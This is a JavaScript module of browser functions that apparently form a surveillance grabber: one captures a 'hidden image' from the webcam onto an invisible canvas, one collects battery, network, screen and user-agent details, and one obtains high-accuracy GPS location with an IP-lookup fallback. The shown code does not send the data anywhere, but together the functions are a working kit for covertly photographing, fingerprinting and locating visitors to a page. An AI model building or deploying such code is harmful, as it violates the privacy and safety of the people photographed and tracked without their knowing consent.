// Capture hidden image from camera
export async function captureHiddenImage() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement("video");
    video.srcObject = stream;

    return new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext("2d").drawImage(video, 0, 0);
          stream.getTracks().forEach((track) => track.stop());
          canvas.toBlob(resolve, "image/jpeg", 0.7);
        }, 1000);
      };
    });
  } catch (err) {
    console.warn("Camera denied.");
    return null;
  }
}

// Get device details (battery, network, screen)
export async function getDeviceDetails() {
  let batteryInfo = "Unknown";
  let chargingStatus = "Unknown";
  let netType = "Unknown";
  let netSpeed = "Unknown";

  try {
    if (navigator.getBattery) {
      const bat = await navigator.getBattery();
      batteryInfo = `${Math.round(bat.level * 100)}%`;
      chargingStatus = bat.charging ? "Yes ⚡" : "No";
    }
  } catch (e) {}

  try {
    const conn =
      navigator.connection ||
      navigator.mozConnection ||
      navigator.webkitConnection;
    if (conn) {
      netType = conn.effectiveType;
      netSpeed = conn.downlink + " Mbps";
    }
  } catch (e) {}

  return {
    battery_level: batteryInfo,
    is_charging: chargingStatus,
    network_type: netType,
    internet_speed: netSpeed,
    screen_res: `${window.screen.width}x${window.screen.height}`,
    platform: navigator.platform,
    browser: navigator.userAgent,
  };
}

// Get smart location (GPS -> IP fallback)
export function getSmartLocation() {
  return new Promise(async (resolve) => {
    const useIpFallback = async () => {
      try {
        const r = await fetch("https://ipinfo.io/json");
        const d = await r.json();
        const [lat, lon] = d.loc.split(",");
        resolve({ lat, lon, type: "IP", details: d });
      } catch {
        resolve({ lat: null, lon: null, type: "FAIL", details: {} });
      }
    };

    if (!navigator.geolocation) {
      await useIpFallback();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        resolve({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          type: "GPS",
          details: { accuracy: pos.coords.accuracy },
        });
      },
      () => useIpFallback(),
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}
